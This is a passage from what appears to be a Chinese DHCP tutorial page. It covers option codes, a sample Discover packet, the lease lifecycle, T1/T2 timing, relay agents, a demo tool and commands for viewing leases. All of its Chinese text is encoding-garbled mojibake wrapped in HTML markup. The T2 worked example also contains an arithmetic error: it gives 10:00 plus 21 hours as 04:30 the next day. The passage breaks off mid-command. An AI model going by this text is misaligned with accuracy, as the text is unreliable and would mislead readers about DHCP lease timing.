0x63825363<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Options <span class="hljs-params">(å¯å˜)</span>     é€‰é¡¹å­—æ®µ          â”‚ DHCPæ¶ˆæ¯ç±»å‹ã€å‚æ•°ç­‰<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="3-2-é‡è¦é€‰é¡¹ï¼ˆOptionsï¼‰">3.2 é‡è¦é€‰é¡¹ï¼ˆOptionsï¼‰</h3><p>DHCPçš„æ ¸å¿ƒåŠŸèƒ½åœ¨Optionså­—æ®µï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs less">æ ¼å¼ï¼š<span class="hljs-selector-attr">[é€‰é¡¹ä»£ç ]</span><span class="hljs-selector-attr">[é•¿åº¦]</span><span class="hljs-selector-attr">[æ•°æ®]</span><br><br>å¸¸ç”¨é€‰é¡¹ï¼š<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">53</span> (DHCPæ¶ˆæ¯ç±»å‹) <span class="hljs-selector-tag">-</span> <span class="hljs-number">1</span>å­—èŠ‚<br>â”œâ”€â”€ <span class="hljs-number">1</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Discover</span><br>â”œâ”€â”€ <span class="hljs-number">2</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Offer</span><br>â”œâ”€â”€ <span class="hljs-number">3</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Request</span><br>â”œâ”€â”€ <span class="hljs-number">4</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Decline</span> (æ‹’ç»)<br>â”œâ”€â”€ <span class="hljs-number">5</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Ack</span><br>â”œâ”€â”€ <span class="hljs-number">6</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Nak</span> (å¦è®¤)<br>â”œâ”€â”€ <span class="hljs-number">7</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Release</span> (é‡Šæ”¾)<br>â””â”€â”€ <span class="hljs-number">8</span>: <span class="hljs-selector-tag">DHCP</span> <span class="hljs-selector-tag">Inform</span> (é€šçŸ¥)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">1</span> (å­ç½‘æ©ç ) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚<br>â””â”€â”€ <span class="hljs-number">255.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">3</span> (é»˜è®¤ç½‘å…³) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚Ã—<span class="hljs-selector-tag">n</span><br>â””â”€â”€ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">6</span> (DNSæœåŠ¡å™¨) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚Ã—<span class="hljs-selector-tag">n</span><br>â”œâ”€â”€ <span class="hljs-number">8.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><br>â””â”€â”€ <span class="hljs-number">8.8</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.4</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">51</span> (ç§Ÿçº¦æ—¶é—´) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚<br>â””â”€â”€ <span class="hljs-number">86400</span> (ç§’)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">54</span> (DHCPæœåŠ¡å™¨æ ‡è¯†) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚<br>â””â”€â”€ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span><br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">58</span> (T1ç»­çº¦æ—¶é—´) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚<br>â””â”€â”€ <span class="hljs-number">43200</span> (<span class="hljs-number">50%</span>ç§ŸæœŸ)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">59</span> (T2é‡ç»‘æ—¶é—´) <span class="hljs-selector-tag">-</span> <span class="hljs-number">4</span>å­—èŠ‚<br>â””â”€â”€ <span class="hljs-number">75600</span> (<span class="hljs-number">87.5%</span>ç§ŸæœŸ)<br><br><span class="hljs-selector-tag">Option</span> <span class="hljs-number">255</span> (ç»“æŸæ ‡è®°)<br>â””â”€â”€ é€‰é¡¹ç»“æŸ<br></code></pre></td></tr></table></figure><h3 id="3-3-æŠ¥æ–‡ç¤ºä¾‹">3.3 æŠ¥æ–‡ç¤ºä¾‹</h3><p><strong>DHCP DiscoveræŠ¥æ–‡</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-attribute">â”‚ Op</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (è¯·æ±‚)                         â”‚</span><br><span class="hljs-attribute">â”‚ HType</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (ä»¥å¤ªç½‘)                    â”‚</span><br><span class="hljs-attribute">â”‚ HLen</span><span class="hljs-punctuation">:</span> <span class="hljs-string">6                              â”‚</span><br><span class="hljs-attribute">â”‚ Hops</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0                              â”‚</span><br><span class="hljs-attribute">â”‚ Transaction ID</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x3d1d6b                â”‚</span><br><span class="hljs-attribute">â”‚ Seconds</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0                           â”‚</span><br><span class="hljs-attribute">â”‚ Flags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0000                        â”‚</span><br><span class="hljs-attribute">â”‚ Client IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                   â”‚</span><br><span class="hljs-attribute">â”‚ Your IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                     â”‚</span><br><span class="hljs-attribute">â”‚ Server IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                   â”‚</span><br><span class="hljs-attribute">â”‚ Gateway IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0                  â”‚</span><br><span class="hljs-attribute">â”‚ Client MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">aa:bb:cc:dd:ee:ff        â”‚</span><br><span class="hljs-attribute">â”‚ Magic Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x63825363             â”‚</span><br><span class="hljs-attribute">â”‚ Options</span><span class="hljs-punctuation">:</span> <span class="hljs-string">                            â”‚</span><br><span class="hljs-attribute">â”‚   - Option 53</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1 (Discover)          â”‚</span><br><span class="hljs-attribute">â”‚   - Option 55</span><span class="hljs-punctuation">:</span> <span class="hljs-string">è¯·æ±‚å‚æ•°åˆ—è¡¨           â”‚</span><br><span class="hljs-attribute">â”‚     (1,3,6,15,51,54,58,59)          â”‚</span><br><span class="hljs-attribute">â”‚   - Option 255</span><span class="hljs-punctuation">:</span> <span class="hljs-string">End                  â”‚</span><br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="4-IPåœ°å€ç§Ÿçº¦ç®¡ç†">4. IPåœ°å€ç§Ÿçº¦ç®¡ç†</h2><h3 id="4-1-ç§Ÿçº¦ç”Ÿå‘½å‘¨æœŸ">4.1 ç§Ÿçº¦ç”Ÿå‘½å‘¨æœŸ</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scss">ç§Ÿçº¦çŠ¶æ€æœºï¼š<br><br>    <span class="hljs-selector-attr">[æ— IP]</span><br>      â†“<br>   DHCP DORA<br>      â†“<br>   <span class="hljs-selector-attr">[å·²ç»‘å®š]</span> â†â”€â”€â”€â”€â”€â”€â”<br>      â†“ (<span class="hljs-number">50%</span>ç§ŸæœŸ)  â”‚<br>   <span class="hljs-selector-attr">[ç»­çº¦ä¸­]</span> â”€â”€â”€â”€â”€â”€â”€â”€â”˜ (ç»­çº¦æˆåŠŸ)<br>      â†“ (å¤±è´¥)<br>   <span class="hljs-selector-attr">[é‡ç»‘ä¸­]</span> â†â”€â”€â”€â”€â”€â”€â”<br>      â†“ (<span class="hljs-number">87.5%</span>ç§ŸæœŸ)â”‚<br>   <span class="hljs-selector-attr">[å¹¿æ’­ç»­çº¦]</span> â”€â”€â”€â”€â”€â”€â”˜ (ç»­çº¦æˆåŠŸ)<br>      â†“ (å¤±è´¥)<br>   <span class="hljs-selector-attr">[ç§Ÿçº¦è¿‡æœŸ]</span><br>      â†“<br>    é‡Šæ”¾IP<br>      â†“<br>   é‡æ–°DORA<br></code></pre></td></tr></table></figure><h3 id="4-2-ç§Ÿçº¦æ—¶é—´è®¡ç®—">4.2 ç§Ÿçº¦æ—¶é—´è®¡ç®—</h3><p><strong>ç¤ºä¾‹ï¼šç§ŸæœŸ24å°æ—¶</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs excel">æ—¶é—´ç‚¹è®¡ç®—ï¼š<br><br>ç§Ÿçº¦å¼€å§‹ï¼š<span class="hljs-number">2024</span>-<span class="hljs-number">01</span>-<span class="hljs-number">15</span> <span class="hljs-symbol">10:00</span><span class="hljs-symbol">:00</span><br>ç§Ÿçº¦æ—¶é•¿ï¼š<span class="hljs-number">86400</span>ç§’ (<span class="hljs-number">24</span>å°æ—¶)<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-number">0%</span>        <span class="hljs-number">50%</span>       <span class="hljs-number">87.5%</span>       <span class="hljs-number">100%</span>      â”‚<br>â”‚ â”‚          â”‚          â”‚           â”‚       â”‚<br>â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”‚<br>â”‚ â”‚          â”‚          â”‚           â”‚       â”‚<br>â”‚ <span class="hljs-symbol">10:00</span>    <span class="hljs-symbol">22:00</span>    <span class="hljs-symbol">04:30</span>       <span class="hljs-symbol">10:00</span>      â”‚<br>â”‚ å¼€å§‹      <span class="hljs-symbol">T1</span>ç»­çº¦    <span class="hljs-symbol">T2</span>é‡ç»‘      è¿‡æœŸ      â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br><span class="hljs-symbol">T1</span> (Renewing <span class="hljs-built_in">Time</span>)<span class="hljs-symbol">:</span><br>= å¼€å§‹æ—¶é—´ + ç§ŸæœŸ Ã— <span class="hljs-number">50%</span><br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">12</span>å°æ—¶<br>= <span class="hljs-symbol">22:00</span><br><br><span class="hljs-symbol">T2</span> (Rebinding <span class="hljs-built_in">Time</span>)<span class="hljs-symbol">:</span><br>= å¼€å§‹æ—¶é—´ + ç§ŸæœŸ Ã— <span class="hljs-number">87.5%</span><br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">21</span>å°æ—¶<br>= <span class="hljs-symbol">04:30</span> (æ¬¡æ—¥)<br><br>åˆ°æœŸæ—¶é—´<span class="hljs-symbol">:</span><br>= å¼€å§‹æ—¶é—´ + ç§ŸæœŸ<br>= <span class="hljs-symbol">10:00</span> + <span class="hljs-number">24</span>å°æ—¶<br>= <span class="hljs-symbol">10:00</span> (æ¬¡æ—¥)<br></code></pre></td></tr></table></figure><h3 id="4-3-ç§Ÿçº¦ç®¡ç†ç­–ç•¥">4.3 ç§Ÿçº¦ç®¡ç†ç­–ç•¥</h3><p><strong>æœåŠ¡å™¨ç«¯åœ°å€æ± ç®¡ç†</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">åœ°å€æ± é…ç½®ï¼š<br>â”œâ”€â”€ ç½‘ç»œï¼š<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br>â”œâ”€â”€ å¯ç”¨èŒƒå›´ï¼š<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span> - <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span><br>â”œâ”€â”€ ä¿ç•™åœ°å€ï¼š<br>â”‚   â”œâ”€â”€ <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> (ç½‘å…³)<br>â”‚   â”œâ”€â”€ <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> (DNS)<br>â”‚   â””â”€â”€ <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>-<span class="hljs-number">50</span> (é™æ€IP)<br>â””â”€â”€ DHCPæ± ï¼š<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>-<span class="hljs-number">200</span> (<span class="hljs-number">101</span>ä¸ªåœ°å€)<br><br>åˆ†é…ç­–ç•¥ï¼š<br><span class="hljs-number">1.</span> ä¼˜å…ˆåˆ†é…å®¢æˆ·ç«¯ä¸Šæ¬¡ä½¿ç”¨çš„IP<br><span class="hljs-number">2.</span> é€‰æ‹©ç§Ÿçº¦æœ€æ—©åˆ°æœŸçš„IP<br><span class="hljs-number">3.</span> é¿å…åˆšé‡Šæ”¾çš„IPï¼ˆç­‰å¾…<span class="hljs-number">2</span>åˆ†é’Ÿï¼‰<br><span class="hljs-number">4.</span> è®°å½•æ¯ä¸ªIPçš„ç§Ÿçº¦ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯ç§Ÿçº¦çŠ¶æ€</strong>ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ç§Ÿçº¦æ•°æ®åº“ï¼ˆç¤ºä¾‹ï¼‰ï¼š<br><br>MACåœ°å€            IPåœ°å€         ç§Ÿçº¦å¼€å§‹            ç§Ÿçº¦ç»“æŸ            çŠ¶æ€<br>aa:bb:cc:dd:ee:ff  192.168.1.100  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 10:00   2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 10:00   å·²åˆ†é…<br>11:22:33:44:55:66  192.168.1.101  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 08:30   2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 08:30   å·²åˆ†é…<br>aa:aa:aa:aa:aa:aa  192.168.1.102  2024<span class="hljs-string">-01</span><span class="hljs-string">-14</span> 20:00   2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 20:00   å·²è¿‡æœŸ<br></code></pre></td></tr></table></figure><hr><h2 id="5-DHCPä¸­ç»§ä»£ç†">5. DHCPä¸­ç»§ä»£ç†</h2><h3 id="5-1-ä¸ºä»€ä¹ˆéœ€è¦ä¸­ç»§ï¼Ÿ">5.1 ä¸ºä»€ä¹ˆéœ€è¦ä¸­ç»§ï¼Ÿ</h3><p><strong>é—®é¢˜</strong>ï¼šDHCPä½¿ç”¨å¹¿æ’­ï¼Œä½†å¹¿æ’­ä¸èƒ½è·¨è¶Šè·¯ç”±å™¨</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">åœºæ™¯ï¼šå…¬å¸æœ‰å¤šä¸ªå­ç½‘</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">[å­ç½‘1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.0/24]</span><br>     <span class="hljs-attribute">â†“</span><br><span class="hljs-attribute">  [è·¯ç”±å™¨] â† å¹¿æ’­åœ¨è¿™é‡Œè¢«é˜»æŒ¡</span><br><span class="hljs-attribute">     â†“</span><br><span class="hljs-attribute">[å­ç½‘2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.2.0/24]  â† DHCPæœåŠ¡å™¨åœ¨è¿™é‡Œ</span><br>     <span class="hljs-attribute">â†“</span><br><span class="hljs-attribute">[å­ç½‘3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.3.0/24]</span><br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">-</span> <span class="hljs-string">å­ç½‘1å’Œå­ç½‘3çš„å®¢æˆ·ç«¯æ— æ³•è”ç³»åˆ°å­ç½‘2çš„DHCPæœåŠ¡å™¨</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">éœ€è¦æ¯ä¸ªå­ç½‘éƒ½éƒ¨ç½²DHCPæœåŠ¡å™¨ï¼ŸâŒ å¤ªéº»çƒ¦</span><br></code></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ¡ˆï¼šDHCP Relayï¼ˆä¸­ç»§ä»£ç†ï¼‰</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[å­ç½‘1å®¢æˆ·ç«¯]</span><br>     â†“ å¹¿æ’­ DHCP Discover<br><span class="hljs-string">[è·¯ç”±å™¨/ä¸­ç»§ä»£ç†]</span><br>     â†“ å•æ’­è½¬å‘åˆ°DHCPæœåŠ¡å™¨<br><span class="hljs-string">[å­ç½‘2 DHCPæœåŠ¡å™¨]</span><br>     â†“ å•æ’­å“åº”åˆ°ä¸­ç»§ä»£ç†<br><span class="hljs-string">[è·¯ç”±å™¨/ä¸­ç»§ä»£ç†]</span><br>     â†“ è½¬å‘ç»™å®¢æˆ·ç«¯<br><span class="hljs-string">[å­ç½‘1å®¢æˆ·ç«¯]</span> âœ… è·å¾—IP<br></code></pre></td></tr></table></figure><h3 id="5-2-ä¸­ç»§å·¥ä½œæµç¨‹">5.2 ä¸­ç»§å·¥ä½œæµç¨‹</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">1. å®¢æˆ·ç«¯å¹¿æ’­ Discover</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-attribute">æºIP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.0.0.0</span><br>   <span class="hljs-attribute">ç›®æ ‡IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">255.255.255.255 (å¹¿æ’­)</span><br><br><span class="hljs-attribute">2. ä¸­ç»§ä»£ç†æ”¶åˆ°ï¼Œä¿®æ”¹æŠ¥æ–‡</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-attribute">æºIP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.1 (ä¸­ç»§ä»£ç†åœ°å€)</span><br>   <span class="hljs-attribute">ç›®æ ‡IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.2.100 (DHCPæœåŠ¡å™¨ï¼Œå•æ’­)</span><br>   <span class="hljs-attribute">Gateway IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.1 (å¡«å…¥ä¸­ç»§åœ°å€)</span><br>   <span class="hljs-attribute">Hops</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å¢åŠ 1</span><br><br><span class="hljs-attribute">3. DHCPæœåŠ¡å™¨å¤„ç†</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">çœ‹åˆ°Gateway IPï¼ŒçŸ¥é“å®¢æˆ·ç«¯åœ¨å­ç½‘1</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ä»å­ç½‘1çš„åœ°å€æ± åˆ†é…IP</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">å•æ’­å“åº”ç»™ä¸­ç»§ä»£ç†</span><br><br><span class="hljs-attribute">4. ä¸­ç»§ä»£ç†è½¬å‘</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">å°†å“åº”è½¬å‘ç»™å®¢æˆ·ç«¯ï¼ˆå¹¿æ’­æˆ–å•æ’­ï¼‰</span><br></code></pre></td></tr></table></figure><hr><h2 id="6-å®æˆ˜é¡¹ç›®ï¼šDHCPåˆ†æå·¥å…·">6. å®æˆ˜é¡¹ç›®ï¼šDHCPåˆ†æå·¥å…·</h2><h3 id="6-1-é¡¹ç›®åŠŸèƒ½">6.1 é¡¹ç›®åŠŸèƒ½</h3><p>æˆ‘ä»¬å°†å®ç°ï¼š</p><ol><li>DHCPæŠ¥æ–‡æ„å»ºå™¨</li><li>DHCPæŠ¥æ–‡è§£æå™¨</li><li>æ¨¡æ‹ŸDHCPå®¢æˆ·ç«¯</li><li>åœ°å€ç§Ÿçº¦ä¿¡æ¯æŸ¥çœ‹</li></ol><h3 id="6-2-å·¥å…·æ¼”ç¤º">6.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æœ¬æœºDHCPç§Ÿçº¦ä¿¡æ¯</span><br>python day13_dhcp_tool.py --show-lease<br><br><span class="hljs-comment"># è§£æDHCPæŠ¥æ–‡ï¼ˆä»pcapæ–‡ä»¶ï¼‰</span><br>python day13_dhcp_tool.py --parse capture.pcap<br><br><span class="hljs-comment"># æ¨¡æ‹ŸDHCP Discover</span><br>python day13_dhcp_tool.py --discover<br><br><span class="hljs-comment"># é‡Šæ”¾å½“å‰IP</span><br>python day13_dhcp_tool.py --release<br></code></pre></td></tr></table></figure><hr><h2 id="7-çŸ¥è¯†æ‹“å±•">7. çŸ¥è¯†æ‹“å±•</h2><h3 id="7-1-æŸ¥çœ‹DHCPä¿¡æ¯çš„å‘½ä»¤">7.1 æŸ¥çœ‹DHCPä¿¡æ¯çš„å‘½ä»¤</h3><p><strong>Windows</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹DHCPç§Ÿçº¦ä¿¡æ¯</span><br>ipconfig /all<br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘:<br>   DHCP å·²å¯ç”¨: æ˜¯<br>   IPv4 åœ°å€: 192.168.1.100<br>   å­ç½‘æ©ç : 255.255.255.0<br>   é»˜è®¤ç½‘å…³: 192.168.1.1<br>   DHCP æœåŠ¡å™¨: 192.168.1.1<br>   è·å¾—ç§Ÿçº¦çš„æ—¶é—´: 2024å¹´1æœˆ15æ—¥ 10:00:00<br>   ç§Ÿçº¦è¿‡æœŸçš„æ—¶é—´: 2024å¹´1æœˆ16æ—¥ 10:00:00<br>   DNS æœåŠ¡å™¨: 8.8.8.8<br><br><span class="hljs-comment"># é‡Šæ”¾IPåœ°å€</span><br>ipconfig /release<br><br><span class="hljs-comment"># é‡æ–°è·å–IP</span><br>ipconfig /renew<br></code></pre></td></tr></table></figure><p><strong>Linux</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹ç½‘å¡é…ç½®</span><br>ip addr show<br>ifconfig<br><br><span class="hljs-comment"># æŸ¥çœ‹DHCPç§Ÿçº¦ï¼ˆä¸åŒå‘è¡Œç‰ˆè·¯å¾„ä¸åŒï¼‰</span><br><span class="hljs-built_in">cat</span> /var/lib/dhcp/dhclient.leases       <span class="hljs-comment"># 